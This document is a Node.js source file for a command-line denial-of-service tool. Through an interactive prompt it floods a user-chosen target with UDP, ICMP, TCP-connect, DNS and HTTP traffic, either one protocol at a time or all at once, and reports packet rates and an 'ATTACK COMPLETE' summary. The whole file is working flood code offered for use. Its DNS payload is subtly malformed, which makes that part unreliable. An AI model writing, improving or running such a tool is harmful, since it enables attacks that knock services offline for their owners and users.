const readline = require('readline');
const raw = require('raw-socket');
const dgram = require('dgram');
const process = require('process');
const net = require('net');
const http = require('http');
const chalk = require('chalk'); // For color effects

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const clear = () => process.stdout.write('\x1Bc');
const prompt = (q) => new Promise(res => rl.question(q, res));

const randomPort = () => Math.floor(Math.random() * (65535 - 1024)) + 1024;
const randomDuration = () => Math.floor(Math.random() * 61) + 60;

let intervalLog;

const formatData = (bytes) => (bytes / 1024).toFixed(2) + ' KB';
const formatMB = (bytes) => (bytes / 1024 / 1024).toFixed(2) + ' MB';

const stats = {
    packets: 0,
    data: 0,
    lost: 0,
    success: 0,
    startTime: null,
    maxPPS: 0,
    maxBPS: 0,
};

const pingStats = {
    lastPingTime: Date.now(),
    pingCount: 0,
};

async function init() {
    clear();
    console.log("jrl@zap.live >");
    const cmd = await prompt("Command > ");
    const command = cmd.toUpperCase();

    if (command === "ZXPING") {
        return zxping(); // Calls the zxping function
    }

    const isIRIR = command === 'IRIR-PANZERFAUST';
    if (!["UDP-NUKE", "ICMP-NUKE", "TCP-NUKE", "DNS-NUKE", "HTTP-NUKE", "IRIR-PANZERFAUST"].includes(command)) {
        console.log("Invalid Command");
        process.exit(1);
    }

    const target = await prompt("[¿T] > ");
    const udpPort = isIRIR ? await prompt("[¿U-P] > ") : await prompt("[¿P] > ");
    const tcpPort = isIRIR ? await prompt("[¿T-P] > ") : null;
    const dnsPort = isIRIR ? await prompt("[¿D-P] > ") : null;
    const duration = parseInt(await prompt("[¿DU-!] > ")) || randomDuration();

    stats.startTime = Date.now();
    const endTime = stats.startTime + (duration * 1000);

    clear();
    intervalLog = setInterval(() => printLog(command), Math.floor(Math.random() * 2000) + 4000);

    switch (command) {
        case "ICMP-NUKE": return icmpNuke(target, endTime);
        case "UDP-NUKE": return udpNuke(target, udpPort || randomPort(), endTime);
        case "TCP-NUKE": return tcpNuke(target, tcpPort || randomPort(), endTime);
        case "DNS-NUKE": return dnsNuke(target, dnsPort || 53, endTime);
        case "HTTP-NUKE": return httpNuke(target, endTime);
        case "IRIR-PANZERFAUST": return irirAll(target, udpPort, tcpPort, dnsPort, endTime);
    }
}

async function zxping() {
    const ip = await prompt("IP > ");
    const port = await prompt("Port > ");
    const ping = setInterval(() => {
        const start = Date.now();
        const sock = net.createConnection({ host: ip, port: port }, () => {
            const end = Date.now();
            const pingTime = end - start;
            pingStats.pingCount++;
            const color = getPingColor(pingTime);
            console.log(`${color}${ip}:${port} - ${pingTime}ms`);
        });
        sock.on('error', (err) => {
            console.log(chalk.red(`${ip}:${port} - Error: ${err.message}`));
        });
    }, 1000);
}

function getPingColor(time) {
    if (time < 50) return chalk.green;
    if (time < 150) return chalk.yellow;
    return chalk.red;
}

function icmpNuke(target, endTime) {
    const socket = raw.createSocket({ protocol: raw.Protocol.ICMP });
    const buffer = Buffer.alloc(1024); // Increased packet size
    buffer.writeUInt8(8, 0); // ICMP Echo Request
    buffer.writeUInt8(0, 1);

    const blast = () => {
        if (Date.now() > endTime) return endAttack();
        try {
            socket.send(buffer, 0, buffer.length, target, () => { });
            stats.packets++;
            stats.success++;
            stats.data += buffer.length;
        } catch (e) {
            stats.lost++;
        }
        setImmediate(blast);
    };
    blast();
}

function udpNuke(target, port, endTime) {
    const sock = dgram.createSocket("udp4");
    const buffer = Buffer.alloc(1500); // Increased packet size
    const blast = () => {
        if (Date.now() > endTime) return endAttack();
        sock.send(buffer, 0, buffer.length, port, target, (err) => {
            if (!err) {
                stats.packets++;
                stats.data += buffer.length;
            }
        });
        setImmediate(blast);
    };
    blast();
}

function tcpNuke(target, port, endTime) {
    const blast = () => {
        if (Date.now() > endTime) return endAttack();
        const client = new net.Socket();
        client.connect(port, target, () => {
            stats.packets++;
            stats.data += 1024; // Increased packet size
            client.destroy();
        });
        client.on('error', () => {});
        setImmediate(blast);
    };
    blast();
}

function dnsNuke(target, port, endTime) {
    const sock = dgram.createSocket("udp4");
    const buffer = Buffer.from("\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x03www\\x06google\\x03com\\x00\\x00\\x01\\x00\\x01", 'hex');
    const blast = () => {
        if (Date.now() > endTime) return endAttack();
        sock.send(buffer, 0, buffer.length, port, target, (err) => {
            if (!err) {
                stats.packets++;
                stats.data += buffer.length;
            }
        });
        setImmediate(blast);
    };
    blast();
}

function httpNuke(target, endTime) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    };

    const blast = () => {
        if (Date.now() > endTime) return endAttack();
        const options = {
            hostname: target,
            port: 80,
            path: '/',
            method: 'GET',
            headers: headers
        };

        const req = http.request(options, (res) => {
            res.on('data', () => { });
        });

        req.on('error', () => {});

        req.end();
        stats.packets++;
        stats.data += 1024; // You can adjust this as needed.
        setImmediate(blast);
    };
    blast();
}

function irirAll(target, uPort, tPort, dPort, endTime) {
    udpNuke(target, uPort || randomPort(), endTime);
    tcpNuke(target, tPort || randomPort(), endTime);
    dnsNuke(target, dPort || 53, endTime);
    icmpNuke(target, endTime);
    httpNuke(target, endTime);
}

function printLog(mode) {
    const now = Date.now();
    const seconds = (now - stats.startTime) / 1000;
    const pps = (stats.packets / seconds).toFixed(0);
    const bps = (stats.data / seconds);
    stats.maxPPS = Math.max(stats.maxPPS, pps);
    stats.maxBPS = Math.max(stats.maxBPS, bps);

    clear();
    console.log(`ZAP-PANZERFAUST [${mode}]`);
    console.log(`Packets:         ${stats.packets}`);
    console.log(`Data sent:       ${formatMB(stats.data)}`);
    if (mode.includes("ICMP")) {
        console.log(`Lost:            ${stats.lost}`);
        console.log(`Success:         ${stats.success}`);
    }
    console.log(`Data/sec:        ${formatData(bps)}`);
    console.log(`Packets/sec:     ${pps}`);
}

function endAttack() {
    clearInterval(intervalLog);
    printLog("DONE");
    console.log("\nATTACK COMPLETE");
    console.log("ACCEPTED:", stats.success || stats.packets);
    console.log("DENIED: ", stats.lost);
    console.log("MAX PPS: ", stats.maxPPS);
    console.log("MAX BANDWIDTH: ", formatData(stats.maxBPS));
}

init();
